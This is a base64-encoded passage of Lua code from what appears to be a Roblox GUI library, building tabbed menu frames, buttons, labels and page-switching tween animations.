JzID0gcHJvcGVydGllcy50YWJzIG9yIHByb3BlcnRpZXMuVGFicyBvciB7Ik1haW4iLCAiTWlzYy4iLCAiU2V0dGluZ3MifTsKICAgICAgICAgICAgICAgIHBhZ2VzID0ge307IC0tIGRhdGEgc3RvcmUgZm9yIG11bHRpIHNlY3Rpb25zCiAgICAgICAgICAgICAgICBjdXJyZW50X211bHRpOyAKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXMgPSB7fTsKICAgICAgICAgICAgfSAKCiAgICAgICAgICAgIGxvY2FsIGl0ZW1zID0gY2ZnLml0ZW1zOyBkbyAKICAgICAgICAgICAgICAgIGl0ZW1zWyAidGFiX2hvbGRlciIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGxpYnJhcnkuY2FjaGU7CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgVmlzaWJsZSA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAxOTYsIDAsIDU2KTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgLTIxNiwgMSwgLTEwMSk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLS0gVGFiIGJ1dHRvbnMgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJidXR0b24iIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRCdXR0b24iICwgewogICAgICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLmZvbnQ7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dCA9ICIiOwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBzZWxmLml0ZW1zWyAiYnV0dG9uX2hvbGRlciIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQXV0b0J1dHRvbkNvbG9yID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgMzUpOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0U2l6ZSA9IDE2OwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI5LCAyOSwgMjkpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJpY29uIiBdID0gbGlicmFyeTpjcmVhdGUoICJJbWFnZUxhYmVsIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgSW1hZ2VDb2xvcjMgPSByZ2IoNzIsIDcyLCA3Myk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJidXR0b24iIF07CiAgICAgICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigwLCAwLjUpOwogICAgICAgICAgICAgICAgICAgICAgICBJbWFnZSA9IGNmZy5pY29uOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDEwLCAwLjUsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMjIsIDAsIDIyKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgICAgIH0pOyBsaWJyYXJ5OmFwcGx5X3RoZW1lKGl0ZW1zWyAiaWNvbiIgXSwgImFjY2VudCIsICJJbWFnZUNvbG9yMyIpOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAibmFtZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dExhYmVsIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgRm9udEZhY2UgPSBmb250cy5mb250OwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0gcmdiKDcyLCA3MiwgNzMpOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHQgPSBjZmcubmFtZTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJidXR0b24iIF07CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCAwLCAxLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDQwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0OwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlg7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTY7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJUGFkZGluZyIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAibmFtZSIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1JpZ2h0ID0gZGltKDAsIDUpOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nTGVmdCA9IGRpbSgwLCA1KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImJ1dHRvbiIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDcpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVN0cm9rZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIENvbG9yID0gcmdiKDIzLCAyMywgMjkpOwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImJ1dHRvbiIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgRW5hYmxlZCA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICBBcHBseVN0cm9rZU1vZGUgPSBFbnVtLkFwcGx5U3Ryb2tlTW9kZS5Cb3JkZXIKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIC0tIAoKICAgICAgICAgICAgICAgIC0tIE11bHRpIFNlY3Rpb25zCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJtdWx0aV9zZWN0aW9uX2J1dHRvbl9ob2xkZXIiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gbGlicmFyeS5jYWNoZTsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBWaXNpYmxlID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMSwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJTGlzdExheW91dCIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAibXVsdGlfc2VjdGlvbl9idXR0b25faG9sZGVyIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nID0gZGltKDAsIDcpOwogICAgICAgICAgICAgICAgICAgICAgICBTb3J0T3JkZXIgPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcjsKICAgICAgICAgICAgICAgICAgICAgICAgRmlsbERpcmVjdGlvbiA9IEVudW0uRmlsbERpcmVjdGlvbi5Ib3Jpem9udGFsCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVBhZGRpbmciICwgewogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nVG9wID0gZGltKDAsIDgpOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nQm90dG9tID0gZGltKDAsIDcpOwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm11bHRpX3NlY3Rpb25fYnV0dG9uX2hvbGRlciIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1JpZ2h0ID0gZGltKDAsIDcpOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nTGVmdCA9IGRpbSgwLCA3KQogICAgICAgICAgICAgICAgICAgIH0pOyAgICAgICAgICAgICAgICAgICAgICAgIAoKICAgICAgICAgICAgICAgICAgICBmb3IgXywgc2VjdGlvbiBpbiBjZmcudGFicyBkbwogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBkYXRhID0ge2l0ZW1zID0ge319IAoKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgbXVsdGlfaXRlbXMgPSBkYXRhLml0ZW1zOyBkbyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIEJ1dHRvbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG11bHRpX2l0ZW1zWyAiYnV0dG9uIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0QnV0dG9uIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRm9udEZhY2UgPSBmb250cy5mb250OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9CdXR0b25Db2xvciA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIiI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAibXVsdGlfc2VjdGlvbl9idXR0b25faG9sZGVyIiBdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgMCwgMCwgMzkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ2xpcHNEZXNjZW5kYW50cyA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNSwgMjUsIDI5KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG11bHRpX2l0ZW1zWyAibmFtZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dExhYmVsIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRm9udEZhY2UgPSBmb250cy5mb250OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUZXh0Q29sb3IzID0gcmdiKDYyLCA2MiwgNjMpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRleHQgPSBzZWN0aW9uOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBtdWx0aV9pdGVtc1sgImJ1dHRvbiIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAsIDAsIDEsIDApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFhBbGlnbm1lbnQgPSBFbnVtLlRleHRYQWxpZ25tZW50LkxlZnQ7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTY7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJUGFkZGluZyIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IG11bHRpX2l0ZW1zWyAibmFtZSIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1JpZ2h0ID0gZGltKDAsIDUpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nTGVmdCA9IGRpbSgwLCA1KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG11bHRpX2l0ZW1zWyAiYWNjZW50IiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQW5jaG9yUG9pbnQgPSB2ZWMyKDAsIDEpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBtdWx0aV9pdGVtc1sgImJ1dHRvbiIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCAxMCwgMSwgNCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAtMjAsIDAsIDYpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gdGhlbWVzLnByZXNldC5hY2NlbnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsgbGlicmFyeTphcHBseV90aGVtZShtdWx0aV9pdGVtc1sgImFjY2VudCIgXSwgImFjY2VudCIsICJCYWNrZ3JvdW5kQ29sb3IzIik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUNvcm5lciIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IG11bHRpX2l0ZW1zWyAiYWNjZW50IiBdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBDb3JuZXJSYWRpdXMgPSBkaW0oMCwgOTk5KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gbXVsdGlfaXRlbXNbICJidXR0b24iIF07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmdSaWdodCA9IGRpbSgwLCAxMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmdMZWZ0ID0gZGltKDAsIDEwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBtdWx0aV9pdGVtc1sgImJ1dHRvbiIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7IAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLSBUYWIgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbXVsdGlfaXRlbXNbICJ0YWIiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIkZyYW1lIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gbGlicmFyeS5jYWNoZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC0yMCwgMSwgLTIwKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmlzaWJsZSA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUxpc3RMYXlvdXQiICwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBGaWxsRGlyZWN0aW9uID0gRW51bS5GaWxsRGlyZWN0aW9uLlZlcnRpY2FsOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBIb3Jpem9udGFsRmxleCA9IEVudW0uVUlGbGV4QWxpZ25tZW50LkZpbGw7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IG11bHRpX2l0ZW1zWyAidGFiIiBdOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nID0gZGltKDAsIDcpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTb3J0T3JkZXIgPSBFbnVtLlNvcnRPcmRlci5MYXlvdXRPcmRlcjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVmVydGljYWxGbGV4ID0gRW51bS5VSUZsZXhBbGlnbm1lbnQuRmlsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1RvcCA9IGRpbSgwLCA3KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZ0JvdHRvbSA9IGRpbSgwLCA3KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gbXVsdGlfaXRlbXNbICJ0YWIiIF07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmdSaWdodCA9IGRpbSgwLCA3KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZ0xlZnQgPSBkaW0oMCwgNykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgZGF0YS50ZXh0ID0gbXVsdGlfaXRlbXNbICJuYW1lIiBdCiAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEuYWNjZW50ID0gbXVsdGlfaXRlbXNbICJhY2NlbnQiIF0KICAgICAgICAgICAgICAgICAgICAgICAgZGF0YS5idXR0b24gPSBtdWx0aV9pdGVtc1sgImJ1dHRvbiIgXQogICAgICAgICAgICAgICAgICAgICAgICBkYXRhLnBhZ2UgPSBtdWx0aV9pdGVtc1sgInRhYiIgXQogICAgICAgICAgICAgICAgICAgICAgICBkYXRhLnBhcmVudCA9IHNldG1ldGF0YWJsZShkYXRhLCBsaWJyYXJ5KTpzdWJfdGFiKHt9KS5pdGVtc1sgInRhYl9wYXJlbnQiIF0KICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgIC0tIE9sZCBjb2x1bW4gY29kZQogICAgICAgICAgICAgICAgICAgICAgICAtLSBkYXRhLmxlZnQgPSBtdWx0aV9pdGVtc1sgImxlZnQiIF0KICAgICAgICAgICAgICAgICAgICAgICAgLS0gZGF0YS5yaWdodCA9IG11bHRpX2l0ZW1zWyAicmlnaHQiIF0KCgkJCQkJCWZ1bmN0aW9uIGRhdGEub3Blbl9wYWdlKCkKCQkJCQkJCWxvY2FsIHBhZ2UgPSBjZmcuY3VycmVudF9tdWx0aTsgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHBhZ2UgYW5kIHBhZ2UudGV4dCB+PSBkYXRhLnRleHQgdGhlbiAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLml0ZW1zWyAiZ2xvYmFsX2ZhZGUiIF0uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKHNlbGYuaXRlbXNbICJnbG9iYWxfZmFkZSIgXSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxfSwgRW51bS5FYXNpbmdTdHlsZS5RdWFkLCAwLjQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgb2xkX3NpemUgPSBwYWdlLnBhZ2UuU2l6ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhZ2UucGFnZS5TaXplID0gZGltMigxLCAtMjAsIDEsIC0yMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHBhZ2UgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4ocGFnZS50ZXh0LCB7VGV4dENvbG9yMyA9IHJnYig2MiwgNjIsIDYzKX0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihwYWdlLmFjY2VudCwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxfSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKHBhZ2UuYnV0dG9uLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDF9KQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwYWdlLnBhZ2UuVmlzaWJsZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFnZS5wYWdlLlBhcmVudCA9IGxpYnJhcnlbICJjYWNoZSIgXSAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZCAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihkYXRhLnRleHQsIHtUZXh0Q29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpfSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oZGF0YS5hY2NlbnQsIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMH0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGRhdGEuYnV0dG9uLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDB9KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihkYXRhLnBhZ2UsIHtTaXplID0gZGltMigxLCAwLCAxLCAwKX0sIEVudW0uRWFzaW5nU3R5bGUuUXVhZCwgMC40KQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEucGFnZS5WaXNpYmxlID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZGF0YS5wYWdlLlBhcmVudCA9IGl0ZW1zWyJ0YWJ